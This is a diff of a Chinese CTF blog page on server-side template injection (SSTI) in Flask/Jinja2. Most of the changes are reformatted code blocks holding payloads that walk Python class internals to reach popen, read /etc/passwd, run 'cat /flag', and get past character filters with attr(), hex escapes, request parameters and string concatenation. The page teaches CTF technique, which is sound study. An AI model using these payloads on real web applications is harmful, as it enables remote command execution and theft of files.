@@ -11,8 +11,8 @@
   <meta itemprop="name" content="SSTI注入篇">
   <meta itemprop="description" content="SSTI 漏洞成因 ssti 服务端模板注入成因为：web 应用在使用框架（如 python 的 flask、jinjia2、django；java 的 freemarker、velocity；php 的 thinkphp、smarty 等）时，由于程序员对代码编写的不规范、不严谨造成模板注入漏洞，攻击者通过恶意注入模板代码影响服务器端模板引擎的行为。">
   <meta itemprop="datePublished" content="2025-04-20T16:41:52+08:00">
-  <meta itemprop="dateModified" content="2025-04-20T20:38:20+08:00">
-  <meta itemprop="wordCount" content="1339">
+  <meta itemprop="dateModified" content="2025-04-20T20:54:37+08:00">
+  <meta itemprop="wordCount" content="1349">
   <meta itemprop="keywords" content="SSTI注入,Web"><meta property="og:url" content="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/">
   <meta property="og:site_name" content="Hinoatari BLOG">
   <meta property="og:title" content="SSTI注入篇">
@@ -21,7 +21,7 @@
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-04-20T16:41:52+08:00">
-    <meta property="article:modified_time" content="2025-04-20T20:38:20+08:00">
+    <meta property="article:modified_time" content="2025-04-20T20:54:37+08:00">
     <meta property="article:tag" content="SSTI注入">
     <meta property="article:tag" content="Web">
 
@@ -42,8 +42,8 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/hinoatari.github.io\/posts\/ssti%E6%B3%A8%E5%85%A5%E7%AF%87\/"
-    },"genre": "posts","keywords": "SSTI注入, web","wordcount":  1339 ,
-    "url": "https:\/\/hinoatari.github.io\/posts\/ssti%E6%B3%A8%E5%85%A5%E7%AF%87\/","datePublished": "2025-04-20T16:41:52+08:00","dateModified": "2025-04-20T20:38:20+08:00","publisher": {
+    },"genre": "posts","keywords": "SSTI注入, web","wordcount":  1349 ,
+    "url": "https:\/\/hinoatari.github.io\/posts\/ssti%E6%B3%A8%E5%85%A5%E7%AF%87\/","datePublished": "2025-04-20T16:41:52+08:00","dateModified": "2025-04-20T20:54:37+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
@@ -119,7 +119,7 @@
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SSTI注入篇</span>
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Hinoatari</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/ctf/" class="post-category" title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="发布于 2025-04-20 16:41:52"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="更新于 2025-04-20 20:38:20"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="1339 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+      Hinoatari</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/ctf/" class="post-category" title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="发布于 2025-04-20 16:41:52"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="更新于 2025-04-20 20:54:37"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-20">2025-04-20</time></span>&nbsp;<span title="1349 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1400 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -190,15 +190,15 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">**dict** //返回类中的函数和属性，父类子类互不影响
-</span></span><span class="line"><span class="cl"><span class="gs">**base**</span> //返回类的父类 python3
-</span></span><span class="line"><span class="cl"><span class="gs">**mro**</span> //返回类继承的元组，(寻找父类) python3
-</span></span><span class="line"><span class="cl"><span class="gs">**init**</span> //返回类的初始化方法  
-</span></span><span class="line"><span class="cl"><span class="gs">**subclasses**</span>() //返回类中仍然可用的引用 python3
-</span></span><span class="line"><span class="cl"><span class="gs">**globals**</span> //对包含函数全局变量的字典的引用 python3
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dict //返回类中的函数和属性，父类子类互不影响
+</span></span><span class="line"><span class="cl">base //返回类的父类 python3
+</span></span><span class="line"><span class="cl">mro //返回类继承的元组，(寻找父类) python3
+</span></span><span class="line"><span class="cl">init //返回类的初始化方法  
+</span></span><span class="line"><span class="cl">subclasses() //返回类中仍然可用的引用 python3
+</span></span><span class="line"><span class="cl">globals //对包含函数全局变量的字典的引用 python3
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">对于返回的是类实例的话:
-</span></span><span class="line"><span class="cl"><span class="gs">**class**</span> //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">class //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -208,10 +208,10 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.**class**.**mro**[-1]
-</span></span><span class="line"><span class="cl">{}.**class**.**bases**[0]
-</span></span><span class="line"><span class="cl">().**class**.**bases**[0]
-</span></span><span class="line"><span class="cl">[].**class**.**bases**[0]</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[-1]
+</span></span><span class="line"><span class="cl">{}.__class__.__bases__[0]
+</span></span><span class="line"><span class="cl">().__class__.__bases__[0]
+</span></span><span class="line"><span class="cl">[].__class__.__bases__[0]</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -224,7 +224,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">object.**subclasses**()</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object.subclasses()</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -237,7 +237,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.**class**.**mro**[2].**subclasses**()[99].**init**</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -250,7 +250,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.**class**.**mro**[2].**subclasses**()[138].**init**.**globals**[&#39;__builtins__&#39;]</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;]</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -265,7 +265,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">&#39;&#39;.**class**.**mro**[2].**subclasses**()[138].**init**.**globals**[&#39;**builtins**&#39;][<span class="nt">&#39;file&#39;</span>](<span class="na">&#39;/etc/passwd&#39;</span>).read()</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;&#39;.__class__.__mro[2].subclasses()[138].init.globals[&#39;builtins&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="常用目标函数" class="heading-element"><span>常用目标函数</span>
   <a href="#%e5%b8%b8%e7%94%a8%e7%9b%ae%e6%a0%87%e5%87%bd%e6%95%b0" class="heading-mark">
@@ -276,7 +276,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">file、subprocess.Popen、os.popen、exec、eval</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file、subprocess.Popen、os.popen、exec、eval</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="绕过过滤方法" class="heading-element"><span>绕过过滤方法</span>
   <a href="#%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4%e6%96%b9%e6%b3%95" class="heading-mark">
@@ -298,8 +298,8 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">当中括号被过滤时，如下将被限制访问:
-</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[&#39;xx&#39;].[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>)}}
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">当中括号被过滤时，如下将被限制访问:
+</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[&#39;xx&#39;].[&#39;popen&#39;](&#39;cat /flag&#39;)}}
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">可用**getitem**替换中括号[]:
 </span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(13).__getitem__(&#39;popen&#39;)(&#39;cat /flag&#39;)}}</span></span></code></pre></td></tr></table>
@@ -323,15 +323,15 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">原 payload 被限制:
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">原</span> <span class="n">payload</span> <span class="err">被限制</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">1.使用 attr()绕过，payload:
-</span></span><span class="line"><span class="cl">{{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>) | attr(&#39;read&#39;)() }}
-</span></span><span class="line"><span class="cl">同时 get 方法传参?a=**class**<span class="err">&amp;</span>b=**base**<span class="err">&amp;</span>c=**subclasses**<span class="err">&amp;</span>d=**init**<span class="err">&amp;</span>e=**globals**
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">使用</span> <span class="n">attr</span><span class="p">()</span><span class="err">绕过，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">b</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">c</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">e</span><span class="p">)()[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="err">同时</span> <span class="n">get</span> <span class="err">方法传参?</span><span class="n">a</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">__base__</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">d</span><span class="o">=</span><span class="n">__init__</span><span class="o">&amp;</span><span class="n">e</span><span class="o">=</span><span class="n">__globals__</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2.将下划线进行编码绕过，payload:
-</span></span><span class="line"><span class="cl">{{ ().[&#39;\x5f\x5fclass\x5f\x5f&#39;][&#39;\x5f\x5fbase\x5f\x5f&#39;][&#39;\x5f\x5fsubclasses\x5f\x5f&#39;]()[xx][&#39;\x5f\x5finit\x5f\x5f&#39;].[&#39;\x5f\x5fglobals\x5f\x5f&#39;][<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>) }}</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="err">将下划线进行编码绕过，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">class</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">base</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">subclasses</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]()[</span><span class="n">xx</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">init</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span> <span class="p">}}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -351,14 +351,14 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">原 payload 被限制:
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">原</span> <span class="n">payload</span> <span class="err">被限制</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">1.使用 attr()绕过，payload:
-</span></span><span class="line"><span class="cl">{{ () | attr(&#39;__class__&#39;) | attr(&#39;__base__&#39;) | attr(&#39;__subclasses__&#39;)() | attr(&#39;__getitem__&#39;)(xx) | attr(&#39;__init__&#39;) | attr(&#39;__globals__&#39;) | attr(&#39;__getitem__&#39;)(&#39;popen&#39;)(&#39;cat /flag&#39;) | attr(&#39;read&#39;)()}}
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">使用</span> <span class="n">attr</span><span class="p">()</span><span class="err">绕过，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__class__&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__base__&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">)()</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__getitem__&#39;</span><span class="p">)(</span><span class="n">xx</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__getitem__&#39;</span><span class="p">)(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">2.</span> 使用中括号绕过，payload:
-</span></span><span class="line"><span class="cl">   {{ ()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[xx][&#39;__init__&#39;][&#39;__globals__&#39;][<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>)[&#39;read&#39;]()}}</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="err">使用中括号绕过，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="p">{{</span> <span class="p">()[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="n">xx</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()}}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -368,13 +368,13 @@
   </a>
 </h2></li>
 </ul>
-<p>使用<code>{%%}</code>替代<code>{{}}</code>，payload:</p>
+<p>使用{%%}替代{{}}，payload:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">{% print(&#39;&#39;.__class__.__base__.__subclasses__()[xx].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()) %}</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% print(&#39;&#39;.__class__.__base__.__subclasses__()[xx].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()) %}</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -398,18 +398,18 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">当&#39;被过滤后以下访问将被限制
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">当</span><span class="s1">&#39;被过滤后以下访问将被限制</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">1.通过 request.args 的 get 传参输入引号内的内容，payload：
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">request.args.popen</span>](<span class="na">request.args.cmd</span>).read() }}
-</span></span><span class="line"><span class="cl">同时 get 传参?popen=popen<span class="err">&amp;</span>cmd=cat /flag
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">通过</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span> <span class="err">的</span> <span class="n">get</span> <span class="err">传参输入引号内的内容，</span><span class="n">payload</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">popen</span><span class="p">](</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="err">同时</span> <span class="n">get</span> <span class="err">传参?</span><span class="n">popen</span><span class="o">=</span><span class="n">popen</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2.通过 request.form 的 post 传参输入引号内的内容，payload：
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[<span class="nt">request.form.popen</span>](<span class="na">request.form.cmd</span>).read() }}
-</span></span><span class="line"><span class="cl">同时 post 传参?popen=popen<span class="err">&amp;</span>cmd=cat /flag
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="err">通过</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="err">的</span> <span class="n">post</span> <span class="err">传参输入引号内的内容，</span><span class="n">payload</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">117</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">popen</span><span class="p">](</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="err">同时</span> <span class="n">post</span> <span class="err">传参?</span><span class="n">popen</span><span class="o">=</span><span class="n">popen</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">3.使用 cookies 传参，如 request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span><span class="err">使用</span> <span class="n">cookies</span> <span class="err">传参，如</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">k1</span><span class="err">、</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">k2</span><span class="err">、</span><span class="n">k1</span><span class="o">=</span><span class="n">popen</span><span class="p">;</span><span class="n">k2</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可将下划线进行</p>
 </li>
@@ -424,7 +424,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">使用过滤器 length 绕过
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用过滤器 length 绕过
 </span></span><span class="line"><span class="cl">{% set a=&#39;aaa&#39; | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}}</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
@@ -445,14 +445,14 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">1.使用拼接绕过，payload:
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;pop&#39;+&#39;en&#39;</span>](<span class="na">&#39;cat /fl&#39; + &#39;ag&#39;</span>).read() }}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mf">1.</span><span class="err">使用拼接绕过，</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="p">()</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">xx</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="o">+</span><span class="s1">&#39;en&#39;</span><span class="p">](</span><span class="s1">&#39;cat /fl&#39;</span> <span class="o">+</span> <span class="s1">&#39;ag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">2.16 进制编码绕过，payload:
-</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;\x70\x6f\x70\x65\x6e&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl"><span class="mf">2.16</span><span class="err">进制编码绕过，</span><span class="n">payload</span><span class="p">:</span>
